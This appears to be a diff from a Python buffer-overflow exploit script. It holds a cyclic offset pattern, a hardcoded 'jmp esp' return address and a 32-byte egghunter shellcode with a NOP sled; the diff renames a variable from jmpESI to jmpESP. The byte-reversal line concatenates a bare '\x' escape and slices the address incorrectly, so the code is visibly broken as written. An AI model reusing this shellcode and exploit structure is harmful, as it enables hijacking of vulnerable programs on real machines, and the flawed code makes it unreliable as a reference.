@@ -4,10 +4,10 @@ import time
 #unique pattern
 pattern = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9"
 
-# jmp esi Address
+# jmp esp Address
 
 jmpESP = "77c9a320"
-PSEpmj = "\x"+jmpESI[7:] + "\x"+jmpESI[5:-2] + "\x"+jmpESI[3:-4] + "\x"+jmpESI[:-7]
+PSEpmj = "\x"+jmpESP[7:] + "\x"+jmpESP[5:-2] + "\x"+jmpESP[3:-4] + "\x"+jmpESP[:-7]
 
 # egghunter (32byte) plus nop(8byte) fuer 40 byte + jmpESP little endian
 egghunter = "\x90\x90\x90\x90\x90\x90\x90\x90\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x77\x30\x30\x74\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"
